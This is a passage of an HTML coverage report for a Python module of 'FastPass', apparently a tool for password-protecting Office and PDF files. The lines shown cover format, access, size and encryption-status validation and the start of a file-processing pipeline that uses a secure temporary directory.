    <p class="mis show_mis"><span class="n"><a id="t119" href="#t119">119</a></span><span class="t">                        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">warning</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Extension </span><span class="op">{</span><span class="nam">file_ext</span><span class="op">}</span><span class="fst"> != detected </span><span class="op">{</span><span class="nam">detected_ext</span><span class="op">}</span><span class="fst"> for </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t120" href="#t120">120</a></span><span class="t">                    <span class="key">return</span> <span class="nam">detected_ext</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t121" href="#t121">121</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t122" href="#t122">122</a></span><span class="t">            <span class="com"># B3b_Fallback: Use Extension Validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t123" href="#t123">123</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">warning</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Magic number detection failed for </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t124" href="#t124">124</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t125" href="#t125">125</a></span><span class="t">        <span class="com"># B3c: Validate Extension Against Supported Formats</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t126" href="#t126">126</a></span><span class="t">        <span class="nam">file_ext</span> <span class="op">=</span> <span class="nam">file_path</span><span class="op">.</span><span class="nam">suffix</span><span class="op">.</span><span class="nam">lower</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t127" href="#t127">127</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t128" href="#t128">128</a></span><span class="t">        <span class="com"># B3d: Verify FastPass Can Handle This Format</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t129" href="#t129">129</a></span><span class="t">        <span class="key">if</span> <span class="nam">file_ext</span> <span class="key">not</span> <span class="key">in</span> <span class="nam">FastPassConfig</span><span class="op">.</span><span class="nam">SUPPORTED_FORMATS</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t130" href="#t130">130</a></span><span class="t">            <span class="com"># B3d_Unsupported: File Type Not Supported</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t131" href="#t131">131</a></span><span class="t">            <span class="key">raise</span> <span class="nam">FileFormatError</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t132" href="#t132">132</a></span><span class="t">                <span class="fst">f"</span><span class="fst">Unsupported file format: </span><span class="op">{</span><span class="nam">file_ext</span><span class="op">}</span><span class="fst">. </span><span class="fst">"</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t133" href="#t133">133</a></span><span class="t">                <span class="fst">f"</span><span class="fst">Supported formats: </span><span class="op">{</span><span class="nam">list</span><span class="op">(</span><span class="nam">FastPassConfig</span><span class="op">.</span><span class="nam">SUPPORTED_FORMATS</span><span class="op">.</span><span class="nam">keys</span><span class="op">(</span><span class="op">)</span><span class="op">)</span><span class="op">}</span><span class="fst">"</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t134" href="#t134">134</a></span><span class="t">            <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t135" href="#t135">135</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t136" href="#t136">136</a></span><span class="t">        <span class="key">return</span> <span class="nam">file_ext</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t137" href="#t137">137</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t138" href="#t138">138</a></span><span class="t">    <span class="key">def</span> <span class="nam">_validate_file_access_and_size</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">file_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">)</span> <span class="op">-></span> <span class="key">None</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t139" href="#t139">139</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t140" href="#t140">140</a></span><span class="t"><span class="str">        B4a-B4d: File Access Validation</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t141" href="#t141">141</a></span><span class="t"><span class="str">        Check file readability, size limits, and permissions</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t142" href="#t142">142</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t143" href="#t143">143</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t144" href="#t144">144</a></span><span class="t">        <span class="com"># B4a: Test File Reading Capability</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t145" href="#t145">145</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t146" href="#t146">146</a></span><span class="t">            <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">file_path</span><span class="op">,</span> <span class="str">'rb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">f</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t147" href="#t147">147</a></span><span class="t">                <span class="com"># Read a small sample to verify access</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t148" href="#t148">148</a></span><span class="t">                <span class="nam">f</span><span class="op">.</span><span class="nam">read</span><span class="op">(</span><span class="num">1024</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t149" href="#t149">149</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t150" href="#t150">150</a></span><span class="t">            <span class="com"># B4a_Read: File Reading Blocked</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t151" href="#t151">151</a></span><span class="t">            <span class="key">raise</span> <span class="nam">FileFormatError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Cannot read file </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t152" href="#t152">152</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t153" href="#t153">153</a></span><span class="t">        <span class="com"># B4b: Check File Size Limits</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t154" href="#t154">154</a></span><span class="t">        <span class="nam">file_size</span> <span class="op">=</span> <span class="nam">file_path</span><span class="op">.</span><span class="nam">stat</span><span class="op">(</span><span class="op">)</span><span class="op">.</span><span class="nam">st_size</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t155" href="#t155">155</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t156" href="#t156">156</a></span><span class="t">        <span class="key">if</span> <span class="nam">file_size</span> <span class="op">==</span> <span class="num">0</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t157" href="#t157">157</a></span><span class="t">            <span class="com"># B4b_Empty: File Contains No Data</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t158" href="#t158">158</a></span><span class="t">            <span class="key">raise</span> <span class="nam">FileFormatError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">File is empty: </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t159" href="#t159">159</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t160" href="#t160">160</a></span><span class="t">        <span class="key">if</span> <span class="nam">file_size</span> <span class="op">></span> <span class="nam">self</span><span class="op">.</span><span class="nam">max_file_size</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t161" href="#t161">161</a></span><span class="t">            <span class="com"># B4b_Large: File Exceeds Size Limit</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t162" href="#t162">162</a></span><span class="t">            <span class="key">raise</span> <span class="nam">FileFormatError</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t163" href="#t163">163</a></span><span class="t">                <span class="fst">f"</span><span class="fst">File too large: </span><span class="op">{</span><span class="nam">file_size</span><span class="op">}</span><span class="fst"> bytes (limit: </span><span class="op">{</span><span class="nam">self</span><span class="op">.</span><span class="nam">max_file_size</span><span class="op">}</span><span class="fst"> bytes)</span><span class="fst">"</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis mis2 show_mis"><span class="n"><a id="t164" href="#t164">164</a></span><span class="t">            <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t165" href="#t165">165</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t166" href="#t166">166</a></span><span class="t">        <span class="com"># B4c: Check File Modification Permission</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t167" href="#t167">167</a></span><span class="t">        <span class="nam">parent_dir</span> <span class="op">=</span> <span class="nam">file_path</span><span class="op">.</span><span class="nam">parent</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t168" href="#t168">168</a></span><span class="t">        <span class="key">if</span> <span class="key">not</span> <span class="nam">os</span><span class="op">.</span><span class="nam">access</span><span class="op">(</span><span class="nam">parent_dir</span><span class="op">,</span> <span class="nam">os</span><span class="op">.</span><span class="nam">W_OK</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t169" href="#t169">169</a></span><span class="t">            <span class="com"># B4c_Write: File Modification Blocked</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t170" href="#t170">170</a></span><span class="t">            <span class="key">raise</span> <span class="nam">FileFormatError</span><span class="op">(</span><span class="fst">f"</span><span class="fst">No write permission for directory: </span><span class="op">{</span><span class="nam">parent_dir</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t171" href="#t171">171</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t172" href="#t172">172</a></span><span class="t">    <span class="key">def</span> <span class="nam">_detect_encryption_status</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">file_path</span><span class="op">:</span> <span class="nam">Path</span><span class="op">,</span> <span class="nam">file_format</span><span class="op">:</span> <span class="nam">str</span><span class="op">)</span> <span class="op">-></span> <span class="nam">bool</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t173" href="#t173">173</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t174" href="#t174">174</a></span><span class="t"><span class="str">        B5a-B5c: Encryption Status Detection</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t175" href="#t175">175</a></span><span class="t"><span class="str">        Determine if file is password-protected</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t176" href="#t176">176</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t177" href="#t177">177</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t178" href="#t178">178</a></span><span class="t">        <span class="com"># B5a: Determine File Type Handler</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t179" href="#t179">179</a></span><span class="t">        <span class="nam">crypto_tool</span> <span class="op">=</span> <span class="nam">FastPassConfig</span><span class="op">.</span><span class="nam">SUPPORTED_FORMATS</span><span class="op">[</span><span class="nam">file_format</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t180" href="#t180">180</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t181" href="#t181">181</a></span><span class="t">        <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t182" href="#t182">182</a></span><span class="t">            <span class="com"># B5b: Test Encryption Status</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t183" href="#t183">183</a></span><span class="t">            <span class="key">with</span> <span class="nam">open</span><span class="op">(</span><span class="nam">file_path</span><span class="op">,</span> <span class="str">'rb'</span><span class="op">)</span> <span class="key">as</span> <span class="nam">f</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t184" href="#t184">184</a></span><span class="t">                <span class="key">if</span> <span class="nam">crypto_tool</span> <span class="op">==</span> <span class="str">'msoffcrypto'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t185" href="#t185">185</a></span><span class="t">                    <span class="com"># B5a_Office: Office Document Detection</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t186" href="#t186">186</a></span><span class="t">                    <span class="key">import</span> <span class="nam">msoffcrypto</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t187" href="#t187">187</a></span><span class="t">                    <span class="nam">office_file</span> <span class="op">=</span> <span class="nam">msoffcrypto</span><span class="op">.</span><span class="nam">OfficeFile</span><span class="op">(</span><span class="nam">f</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t188" href="#t188">188</a></span><span class="t">                    <span class="key">return</span> <span class="nam">office_file</span><span class="op">.</span><span class="nam">is_encrypted</span><span class="op">(</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t189" href="#t189">189</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t190" href="#t190">190</a></span><span class="t">                <span class="key">elif</span> <span class="nam">crypto_tool</span> <span class="op">==</span> <span class="str">'PyPDF2'</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t191" href="#t191">191</a></span><span class="t">                    <span class="com"># B5a_PDF: PDF Document Detection</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t192" href="#t192">192</a></span><span class="t">                    <span class="key">import</span> <span class="nam">PyPDF2</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t193" href="#t193">193</a></span><span class="t">                    <span class="nam">pdf_reader</span> <span class="op">=</span> <span class="nam">PyPDF2</span><span class="op">.</span><span class="nam">PdfReader</span><span class="op">(</span><span class="nam">f</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t194" href="#t194">194</a></span><span class="t">                    <span class="key">return</span> <span class="nam">pdf_reader</span><span class="op">.</span><span class="nam">is_encrypted</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t195" href="#t195">195</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t196" href="#t196">196</a></span><span class="t">        <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t197" href="#t197">197</a></span><span class="t">            <span class="com"># B5b_Failed: Encryption Detection Failed</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t198" href="#t198">198</a></span><span class="t">            <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">warning</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Cannot detect encryption for </span><span class="op">{</span><span class="nam">file_path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t199" href="#t199">199</a></span><span class="t">            <span class="com"># Assume unencrypted and proceed with caution</span>&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t200" href="#t200">200</a></span><span class="t">            <span class="key">return</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t201" href="#t201">201</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="mis show_mis"><span class="n"><a id="t202" href="#t202">202</a></span><span class="t">        <span class="key">return</span> <span class="key">False</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t203" href="#t203">203</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t204" href="#t204">204</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t205" href="#t205">205</a></span><span class="t"><span class="key">class</span> <span class="nam">FileProcessor</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t206" href="#t206">206</a></span><span class="t">    <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t207" href="#t207">207</a></span><span class="t"><span class="str">    File processing pipeline with crypto operations</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t208" href="#t208">208</a></span><span class="t"><span class="str">    Maps to Section D from flowchart</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t209" href="#t209">209</a></span><span class="t"><span class="str">    """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t210" href="#t210">210</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t211" href="#t211">211</a></span><span class="t">    <span class="key">def</span> <span class="nam">__init__</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">logger</span><span class="op">:</span> <span class="nam">logging</span><span class="op">.</span><span class="nam">Logger</span><span class="op">,</span> <span class="nam">config</span><span class="op">:</span> <span class="nam">Dict</span><span class="op">[</span><span class="nam">str</span><span class="op">,</span> <span class="nam">Any</span><span class="op">]</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t212" href="#t212">212</a></span><span class="t">                 <span class="nam">password_manager</span><span class="op">,</span> <span class="nam">crypto_handlers</span><span class="op">:</span> <span class="nam">Dict</span><span class="op">,</span> <span class="nam">temp_files_created</span><span class="op">:</span> <span class="nam">List</span><span class="op">)</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t213" href="#t213">213</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span> <span class="op">=</span> <span class="nam">logger</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t214" href="#t214">214</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">config</span> <span class="op">=</span> <span class="nam">config</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t215" href="#t215">215</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">password_manager</span> <span class="op">=</span> <span class="nam">password_manager</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t216" href="#t216">216</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">crypto_handlers</span> <span class="op">=</span> <span class="nam">crypto_handlers</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t217" href="#t217">217</a></span><span class="t">        <span class="nam">self</span><span class="op">.</span><span class="nam">temp_files_created</span> <span class="op">=</span> <span class="nam">temp_files_created</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t218" href="#t218">218</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t219" href="#t219">219</a></span><span class="t">    <span class="key">def</span> <span class="nam">process_files</span><span class="op">(</span><span class="nam">self</span><span class="op">,</span> <span class="nam">validated_files</span><span class="op">:</span> <span class="nam">List</span><span class="op">[</span><span class="nam">FileManifest</span><span class="op">]</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t220" href="#t220">220</a></span><span class="t">                     <span class="nam">operation</span><span class="op">:</span> <span class="nam">str</span><span class="op">,</span> <span class="nam">output_dir</span><span class="op">:</span> <span class="nam">Optional</span><span class="op">[</span><span class="nam">Path</span><span class="op">]</span><span class="op">)</span> <span class="op">-></span> <span class="nam">Dict</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t221" href="#t221">221</a></span><span class="t">        <span class="str">"""</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t222" href="#t222">222</a></span><span class="t"><span class="str">        D2a-D4g: Main File Processing Pipeline</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t223" href="#t223">223</a></span><span class="t"><span class="str">        Process all validated files with crypto operations</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t224" href="#t224">224</a></span><span class="t"><span class="str">        """</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t225" href="#t225">225</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t226" href="#t226">226</a></span><span class="t">        <span class="com"># D1a-D1f: Initialize TempFileManager and secure temp directory</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t227" href="#t227">227</a></span><span class="t">        <span class="key">with</span> <span class="nam">tempfile</span><span class="op">.</span><span class="nam">TemporaryDirectory</span><span class="op">(</span><span class="nam">prefix</span><span class="op">=</span><span class="nam">self</span><span class="op">.</span><span class="nam">config</span><span class="op">[</span><span class="str">'temp_dir_prefix'</span><span class="op">]</span><span class="op">)</span> <span class="key">as</span> <span class="nam">temp_dir_str</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t228" href="#t228">228</a></span><span class="t">            <span class="nam">temp_dir</span> <span class="op">=</span> <span class="nam">Path</span><span class="op">(</span><span class="nam">temp_dir_str</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t229" href="#t229">229</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t230" href="#t230">230</a></span><span class="t">            <span class="com"># D1c: Set Enhanced Secure Permissions</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t231" href="#t231">231</a></span><span class="t">            <span class="nam">temp_dir</span><span class="op">.</span><span class="nam">chmod</span><span class="op">(</span><span class="num">0o700</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t232" href="#t232">232</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t233" href="#t233">233</a></span><span class="t">            <span class="com"># Create processing subdirectories</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t234" href="#t234">234</a></span><span class="t">            <span class="nam">processing_dir</span> <span class="op">=</span> <span class="nam">temp_dir</span> <span class="op">/</span> <span class="str">'processing'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t235" href="#t235">235</a></span><span class="t">            <span class="nam">output_temp_dir</span> <span class="op">=</span> <span class="nam">temp_dir</span> <span class="op">/</span> <span class="str">'output'</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t236" href="#t236">236</a></span><span class="t">            <span class="nam">processing_dir</span><span class="op">.</span><span class="nam">mkdir</span><span class="op">(</span><span class="nam">mode</span><span class="op">=</span><span class="num">0o700</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t237" href="#t237">237</a></span><span class="t">            <span class="nam">output_temp_dir</span><span class="op">.</span><span class="nam">mkdir</span><span class="op">(</span><span class="nam">mode</span><span class="op">=</span><span class="num">0o700</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t238" href="#t238">238</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t239" href="#t239">239</a></span><span class="t">            <span class="com"># D2a: Initialize Processing Results</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t240" href="#t240">240</a></span><span class="t">            <span class="nam">successful_files</span> <span class="op">=</span> <span class="op">[</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t241" href="#t241">241</a></span><span class="t">            <span class="nam">failed_files</span> <span class="op">=</span> <span class="op">[</span><span class="op">]</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t242" href="#t242">242</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t243" href="#t243">243</a></span><span class="t">            <span class="com"># D2b: Start Main Processing Loop</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t244" href="#t244">244</a></span><span class="t">            <span class="key">for</span> <span class="nam">file_manifest</span> <span class="key">in</span> <span class="nam">validated_files</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t245" href="#t245">245</a></span><span class="t">                <span class="key">try</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t246" href="#t246">246</a></span><span class="t">                    <span class="nam">result</span> <span class="op">=</span> <span class="nam">self</span><span class="op">.</span><span class="nam">_process_single_file</span><span class="op">(</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t247" href="#t247">247</a></span><span class="t">                        <span class="nam">file_manifest</span><span class="op">,</span> <span class="nam">operation</span><span class="op">,</span> <span class="nam">output_dir</span><span class="op">,</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t248" href="#t248">248</a></span><span class="t">                        <span class="nam">processing_dir</span><span class="op">,</span> <span class="nam">output_temp_dir</span>&nbsp;</span><span class="r"></span></p>
    <p class="run run2"><span class="n"><a id="t249" href="#t249">249</a></span><span class="t">                    <span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t250" href="#t250">250</a></span><span class="t">                    <span class="nam">successful_files</span><span class="op">.</span><span class="nam">append</span><span class="op">(</span><span class="nam">result</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t251" href="#t251">251</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t252" href="#t252">252</a></span><span class="t">                <span class="key">except</span> <span class="nam">Exception</span> <span class="key">as</span> <span class="nam">e</span><span class="op">:</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t253" href="#t253">253</a></span><span class="t">                    <span class="nam">error</span> <span class="op">=</span> <span class="nam">FileProcessingError</span><span class="op">(</span><span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span><span class="op">,</span> <span class="nam">str</span><span class="op">(</span><span class="nam">e</span><span class="op">)</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t254" href="#t254">254</a></span><span class="t">                    <span class="nam">failed_files</span><span class="op">.</span><span class="nam">append</span><span class="op">(</span><span class="nam">error</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t255" href="#t255">255</a></span><span class="t">                    <span class="nam">self</span><span class="op">.</span><span class="nam">logger</span><span class="op">.</span><span class="nam">error</span><span class="op">(</span><span class="fst">f"</span><span class="fst">Failed to process </span><span class="op">{</span><span class="nam">file_manifest</span><span class="op">.</span><span class="nam">path</span><span class="op">}</span><span class="fst">: </span><span class="op">{</span><span class="nam">e</span><span class="op">}</span><span class="fst">"</span><span class="op">)</span>&nbsp;</span><span class="r"></span></p>
    <p class="pln"><span class="n"><a id="t256" href="#t256">256</a></span><span class="t">&nbsp;</span><span class="r"></span></p>
    <p class="run"><span class="n"><a id="t257" href="#t257">257</a></span><span class="t">            <span class="key">return</span> <span class="op">{</span>&nbsp;</span><span class="r"></span></p>
